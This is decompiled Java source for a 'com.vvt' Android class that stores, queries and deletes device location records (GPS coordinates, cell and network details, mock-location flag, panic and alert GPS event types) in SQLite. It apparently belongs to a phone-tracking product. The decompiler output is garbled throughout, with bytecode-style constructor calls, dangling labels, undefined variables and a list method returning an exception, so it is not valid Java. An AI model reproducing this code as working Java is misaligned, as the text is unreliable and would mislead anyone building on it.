package com.vvt.eventrepository.a;

import android.content.ContentValues;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteDatabaseCorruptException;
import com.vvt.base.FxEvent;
import com.vvt.base.FxEventType;
import com.vvt.eventrepository.a;
import com.vvt.eventrepository.querycriteria.QueryOrder;
import com.vvt.events.FxCallingModuleType;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxLocationEvent;
import com.vvt.events.FxLocationMapProvider;
import com.vvt.events.FxLocationMethod;
import com.vvt.exceptions.database.FxDbCorruptException;
import com.vvt.exceptions.database.FxDbOperationException;
import java.util.ArrayList;
import java.util.List;

public class x
  extends o
{
  private static final boolean a = a.a;
  private SQLiteDatabase b;
  private FxCallingModuleType c;
  
  public x(SQLiteDatabase paramSQLiteDatabase, FxCallingModuleType paramFxCallingModuleType)
  {
    this.b = paramSQLiteDatabase;
    this.c = paramFxCallingModuleType;
  }
  
  private List b(QueryOrder paramQueryOrder, int paramInt)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject2 = "location";
    Object localObject3 = n.a(paramQueryOrder);
    Object localObject4 = Integer.toString(paramInt);
    Object localObject5 = new java/lang/StringBuilder;
    ((StringBuilder)localObject5).<init>();
    localObject5 = ((StringBuilder)localObject5).append("calling_module = ");
    int i = this.c.getNumber();
    String str2 = i;
    localObject5 = null;
    int n;
    int i1;
    int i15;
    try
    {
      Object localObject6 = this.b;
      localObject5 = n.a((SQLiteDatabase)localObject6, (String)localObject2, str2, (String)localObject3, (String)localObject4);
      if (localObject5 == null) {
        break label1268;
      }
      boolean bool1 = ((Cursor)localObject5).moveToNext();
      if (!bool1) {
        break label1268;
      }
      localObject2 = new com/vvt/events/FxLocationEvent;
      ((FxLocationEvent)localObject2).<init>();
      localObject3 = "_id";
      int j = ((Cursor)localObject5).getColumnIndex((String)localObject3);
      long l1 = ((Cursor)localObject5).getLong(j);
      str2 = "cellid";
      i = ((Cursor)localObject5).getColumnIndex(str2);
      i = ((Cursor)localObject5).getInt(i);
      localObject6 = "method";
      n = ((Cursor)localObject5).getColumnIndex((String)localObject6);
      n = ((Cursor)localObject5).getInt(n);
      String str3 = "provider";
      i1 = ((Cursor)localObject5).getColumnIndex(str3);
      i1 = ((Cursor)localObject5).getInt(i1);
      String str4 = "time";
      int i2 = ((Cursor)localObject5).getColumnIndex(str4);
      long l2 = ((Cursor)localObject5).getLong(i2);
      String str5 = "areacode";
      int i3 = ((Cursor)localObject5).getColumnIndex(str5);
      str5 = ((Cursor)localObject5).getString(i3);
      long l3 = Long.parseLong(str5);
      Object localObject7 = "latitude";
      int i4 = ((Cursor)localObject5).getColumnIndex((String)localObject7);
      float f1 = ((Cursor)localObject5).getFloat(i4);
      localObject7 = Float.valueOf(f1);
      Object localObject8 = "longitude";
      int i5 = ((Cursor)localObject5).getColumnIndex((String)localObject8);
      float f2 = ((Cursor)localObject5).getFloat(i5);
      localObject8 = Float.valueOf(f2);
      Object localObject9 = "altitude";
      int i6 = ((Cursor)localObject5).getColumnIndex((String)localObject9);
      float f3 = ((Cursor)localObject5).getFloat(i6);
      localObject9 = Float.valueOf(f3);
      Object localObject10 = "heading";
      int i7 = ((Cursor)localObject5).getColumnIndex((String)localObject10);
      float f4 = ((Cursor)localObject5).getFloat(i7);
      localObject10 = Float.valueOf(f4);
      Object localObject11 = "horizontal_accuracy";
      int i8 = ((Cursor)localObject5).getColumnIndex((String)localObject11);
      float f5 = ((Cursor)localObject5).getFloat(i8);
      localObject11 = Float.valueOf(f5);
      Object localObject12 = "speed";
      int i9 = ((Cursor)localObject5).getColumnIndex((String)localObject12);
      float f6 = ((Cursor)localObject5).getFloat(i9);
      localObject12 = Float.valueOf(f6);
      Object localObject13 = "vertical_accuracy";
      int i10 = ((Cursor)localObject5).getColumnIndex((String)localObject13);
      float f7 = ((Cursor)localObject5).getFloat(i10);
      localObject13 = Float.valueOf(f7);
      String str6 = "cellname";
      int i11 = ((Cursor)localObject5).getColumnIndex(str6);
      str6 = ((Cursor)localObject5).getString(i11);
      String str7 = "countrycode";
      int i12 = ((Cursor)localObject5).getColumnIndex(str7);
      str7 = ((Cursor)localObject5).getString(i12);
      String str8 = "networkid";
      int i13 = ((Cursor)localObject5).getColumnIndex(str8);
      str8 = ((Cursor)localObject5).getString(i13);
      String str9 = "networkname";
      int i14 = ((Cursor)localObject5).getColumnIndex(str9);
      str9 = ((Cursor)localObject5).getString(i14);
      ((FxLocationEvent)localObject2).setEventId(l1);
      l1 = i;
      ((FxLocationEvent)localObject2).setCellId(l1);
      ((FxLocationEvent)localObject2).setEventTime(l2);
      f8 = ((Float)localObject7).floatValue();
      double d = f8;
      ((FxLocationEvent)localObject2).setLatitude(d);
      f8 = ((Float)localObject8).floatValue();
      d = f8;
      ((FxLocationEvent)localObject2).setLongitude(d);
      f8 = ((Float)localObject9).floatValue();
      d = f8;
      ((FxLocationEvent)localObject2).setAltitude(d);
      f8 = ((Float)localObject10).floatValue();
      ((FxLocationEvent)localObject2).setHeading(f8);
      j = -1082130432;
      f8 = -1.0F;
      ((FxLocationEvent)localObject2).setHeadingAccuracy(f8);
      f8 = ((Float)localObject11).floatValue();
      ((FxLocationEvent)localObject2).setHorizontalAccuracy(f8);
      f8 = ((Float)localObject12).floatValue();
      ((FxLocationEvent)localObject2).setSpeed(f8);
      j = -1082130432;
      f8 = -1.0F;
      ((FxLocationEvent)localObject2).setSpeedAccuracy(f8);
      f8 = ((Float)localObject13).floatValue();
      ((FxLocationEvent)localObject2).setVerticalAccuracy(f8);
      ((FxLocationEvent)localObject2).setAreaCode(l3);
      ((FxLocationEvent)localObject2).setCellName(str6);
      ((FxLocationEvent)localObject2).setMobileCountryCode(str7);
      ((FxLocationEvent)localObject2).setNetworkId(str8);
      ((FxLocationEvent)localObject2).setNetworkName(str9);
      f8 = ((Float)localObject7).floatValue();
      i15 = 0;
      localObject4 = null;
      boolean bool2 = f8 < 0.0F;
      if (!bool2) {
        break label1021;
      }
      f8 = ((Float)localObject8).floatValue();
      i15 = 0;
      localObject4 = null;
      bool2 = f8 < 0.0F;
      if (!bool2) {
        break label1021;
      }
      l1 = 0L;
      d = 0.0D;
      bool2 = l2 < l1;
      if (!bool2) {
        break label1021;
      }
      bool2 = false;
      f8 = 0.0F;
      localObject3 = null;
      ((FxLocationEvent)localObject2).setIsMockLocaion(false);
    }
    catch (SQLiteDatabaseCorruptException localSQLiteDatabaseCorruptException)
    {
      for (;;)
      {
        try
        {
          localObject2 = new com/vvt/exceptions/database/FxDbCorruptException;
          str1 = localSQLiteDatabaseCorruptException.getMessage();
          ((FxDbCorruptException)localObject2).<init>(str1);
          throw ((Throwable)localObject2);
        }
        finally
        {
          if (localObject5 != null) {
            ((Cursor)localObject5).close();
          }
        }
        int k = 1;
        float f8 = Float.MIN_VALUE;
        ((FxLocationEvent)localObject2).setIsMockLocaion(k);
      }
    }
    finally
    {
      localObject2 = new com/vvt/exceptions/database/FxDbOperationException;
      localObject3 = localThrowable.getMessage();
      ((FxDbOperationException)localObject2).<init>((String)localObject3, localThrowable);
    }
    localObject3 = FxLocationMethod.UNKNOWN;
    k = ((FxLocationMethod)localObject3).getNumber();
    if (n == k)
    {
      localObject3 = FxLocationMethod.UNKNOWN;
      ((FxLocationEvent)localObject2).setMethod((FxLocationMethod)localObject3);
      label931:
      localObject3 = FxLocationMapProvider.PROVIDER_GOOGLE;
      k = ((FxLocationMapProvider)localObject3).getNumber();
      localObject4 = FxLocationMapProvider.PROVIDER_NOKIA;
      i15 = ((FxLocationMapProvider)localObject4).getNumber();
      if (i1 != k) {
        break label1231;
      }
      localObject3 = FxLocationMapProvider.PROVIDER_GOOGLE;
      ((FxLocationEvent)localObject2).setMapProvider((FxLocationMapProvider)localObject3);
    }
    for (;;)
    {
      localArrayList.add(localObject2);
      break;
      String str1;
      label1021:
      localObject3 = FxLocationMethod.INTERGRATED_GPS;
      int m = ((FxLocationMethod)localObject3).getNumber();
      if (n == m)
      {
        localObject3 = FxLocationMethod.INTERGRATED_GPS;
        ((FxLocationEvent)localObject2).setMethod((FxLocationMethod)localObject3);
        break label931;
      }
      localObject3 = FxLocationMethod.AGPS;
      m = ((FxLocationMethod)localObject3).getNumber();
      if (n == m)
      {
        localObject3 = FxLocationMethod.AGPS;
        ((FxLocationEvent)localObject2).setMethod((FxLocationMethod)localObject3);
        break label931;
      }
      localObject3 = FxLocationMethod.NETWORK;
      m = ((FxLocationMethod)localObject3).getNumber();
      if (n == m)
      {
        localObject3 = FxLocationMethod.NETWORK;
        ((FxLocationEvent)localObject2).setMethod((FxLocationMethod)localObject3);
        break label931;
      }
      localObject3 = FxLocationMethod.BLUETOOTH;
      m = ((FxLocationMethod)localObject3).getNumber();
      if (n == m)
      {
        localObject3 = FxLocationMethod.BLUETOOTH;
        ((FxLocationEvent)localObject2).setMethod((FxLocationMethod)localObject3);
        break label931;
      }
      localObject3 = FxLocationMethod.CELL_INFO;
      m = ((FxLocationMethod)localObject3).getNumber();
      if (n != m) {
        break label931;
      }
      localObject3 = FxLocationMethod.CELL_INFO;
      ((FxLocationEvent)localObject2).setMethod((FxLocationMethod)localObject3);
      break label931;
      label1231:
      if (i1 == i15)
      {
        localObject3 = FxLocationMapProvider.PROVIDER_NOKIA;
        ((FxLocationEvent)localObject2).setMapProvider((FxLocationMapProvider)localObject3);
      }
      else
      {
        localObject3 = FxLocationMapProvider.UNKNOWN;
        ((FxLocationEvent)localObject2).setMapProvider((FxLocationMapProvider)localObject3);
      }
    }
    label1268:
    if (localObject5 != null) {
      ((Cursor)localObject5).close();
    }
    return localThrowable;
  }
  
  public long a(FxEvent paramFxEvent)
  {
    paramFxEvent = (FxLocationEvent)paramFxEvent;
    ContentValues localContentValues = new android/content/ContentValues;
    localContentValues.<init>();
    Object localObject1 = paramFxEvent.getCellName();
    localContentValues.put("cellname", (String)localObject1);
    localObject1 = paramFxEvent.getMobileCountryCode();
    localContentValues.put("countrycode", (String)localObject1);
    localObject1 = paramFxEvent.getNetworkId();
    localContentValues.put("networkid", (String)localObject1);
    localObject1 = paramFxEvent.getNetworkName();
    localContentValues.put("networkname", (String)localObject1);
    localObject1 = Double.valueOf(paramFxEvent.getAltitude());
    localContentValues.put("altitude", (Double)localObject1);
    localObject1 = Long.valueOf(paramFxEvent.getAreaCode());
    localContentValues.put("areacode", (Long)localObject1);
    localObject1 = Long.valueOf(paramFxEvent.getCellId());
    localContentValues.put("cellid", (Long)localObject1);
    long l1 = paramFxEvent.getEventTime();
    localObject1 = Long.valueOf(l1);
    localContentValues.put("time", (Long)localObject1);
    localObject1 = Float.valueOf(paramFxEvent.getHeading());
    localContentValues.put("heading", (Float)localObject1);
    localObject1 = Float.valueOf(paramFxEvent.getHorizontalAccuracy());
    localContentValues.put("horizontal_accuracy", (Float)localObject1);
    localObject1 = Double.valueOf(paramFxEvent.getLatitude());
    localContentValues.put("latitude", (Double)localObject1);
    double d = paramFxEvent.getLongitude();
    localObject1 = Double.valueOf(d);
    localContentValues.put("longitude", (Double)localObject1);
    localObject1 = Float.valueOf(paramFxEvent.getSpeed());
    localContentValues.put("speed", (Float)localObject1);
    float f = paramFxEvent.getVerticalAccuracy();
    localObject1 = Float.valueOf(f);
    localContentValues.put("vertical_accuracy", (Float)localObject1);
    localObject1 = Integer.valueOf(paramFxEvent.getMapProvider().getNumber());
    localContentValues.put("provider", (Integer)localObject1);
    localObject1 = Integer.valueOf(paramFxEvent.getMethod().getNumber());
    localContentValues.put("method", (Integer)localObject1);
    Object localObject2 = "calling_module";
    int i = this.c.getNumber();
    localObject1 = Integer.valueOf(i);
    localContentValues.put((String)localObject2, (Integer)localObject1);
    for (;;)
    {
      long l2;
      try
      {
        localObject2 = this.b;
        localObject1 = "location";
        int k = 0;
        localObject3 = null;
        l2 = ((SQLiteDatabase)localObject2).insert((String)localObject1, null, localContentValues);
        l1 = 0L;
        d = 0.0D;
        boolean bool = l2 < l1;
        if (bool)
        {
          localObject1 = y.a;
          localObject3 = this.c;
          k = ((FxCallingModuleType)localObject3).ordinal();
          int j = localObject1[k];
          switch (j)
          {
          }
        }
      }
      catch (SQLiteDatabaseCorruptException localSQLiteDatabaseCorruptException)
      {
        localObject2 = new com/vvt/exceptions/database/FxDbCorruptException;
        String str = localSQLiteDatabaseCorruptException.getMessage();
        ((FxDbCorruptException)localObject2).<init>(str);
        throw ((Throwable)localObject2);
        localObject1 = this.b;
        localObject3 = FxEventType.PANIC_GPS;
        localFxEventDirection = FxEventDirection.UNKNOWN;
        n.a((SQLiteDatabase)localObject1, l2, (FxEventType)localObject3, localFxEventDirection);
        continue;
      }
      finally
      {
        localObject2 = new com/vvt/exceptions/database/FxDbOperationException;
        localObject1 = localThrowable.getMessage();
        ((FxDbOperationException)localObject2).<init>((String)localObject1, localThrowable);
      }
      return l2;
      localObject1 = this.b;
      Object localObject3 = FxEventType.LOCATION;
      FxEventDirection localFxEventDirection = FxEventDirection.UNKNOWN;
      n.a((SQLiteDatabase)localObject1, l2, (FxEventType)localObject3, localFxEventDirection);
      continue;
      localObject1 = this.b;
      localObject3 = FxEventType.ALERT_GPS;
      localFxEventDirection = FxEventDirection.UNKNOWN;
      n.a((SQLiteDatabase)localObject1, l2, (FxEventType)localObject3, localFxEventDirection);
    }
  }
  
  public List a(QueryOrder paramQueryOrder, int paramInt)
  {
    new ArrayList();
    List localList = b(paramQueryOrder, paramInt);
    boolean bool = a;
    if (bool) {}
    return localList;
  }
  
  public void a()
  {
    Object localObject;
    try
    {
      SQLiteDatabase localSQLiteDatabase = this.b;
      localObject = "location";
      str2 = null;
      localSQLiteDatabase.delete((String)localObject, null, null);
      return;
    }
    catch (SQLiteDatabaseCorruptException localSQLiteDatabaseCorruptException)
    {
      localObject = new com/vvt/exceptions/database/FxDbCorruptException;
      String str1 = localSQLiteDatabaseCorruptException.getMessage();
      ((FxDbCorruptException)localObject).<init>(str1);
      throw ((Throwable)localObject);
    }
    finally
    {
      localObject = new com/vvt/exceptions/database/FxDbOperationException;
      String str2 = localThrowable.getMessage();
      ((FxDbOperationException)localObject).<init>(str2, localThrowable);
    }
  }
  
  public int b(long paramLong)
  {
    Object localObject2;
    try
    {
      Object localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject2 = "_id=";
      localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject1 = ((StringBuilder)localObject1).append(paramLong);
      localObject1 = ((StringBuilder)localObject1).toString();
      localObject2 = this.b;
      str2 = "location";
      return ((SQLiteDatabase)localObject2).delete(str2, (String)localObject1, null);
    }
    catch (SQLiteDatabaseCorruptException localSQLiteDatabaseCorruptException)
    {
      localObject2 = new com/vvt/exceptions/database/FxDbCorruptException;
      String str1 = localSQLiteDatabaseCorruptException.getMessage();
      ((FxDbCorruptException)localObject2).<init>(str1);
      throw ((Throwable)localObject2);
    }
    finally
    {
      localObject2 = new com/vvt/exceptions/database/FxDbOperationException;
      String str2 = localThrowable.getMessage();
      ((FxDbOperationException)localObject2).<init>(str2, localThrowable);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/eventrepository/a/x.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */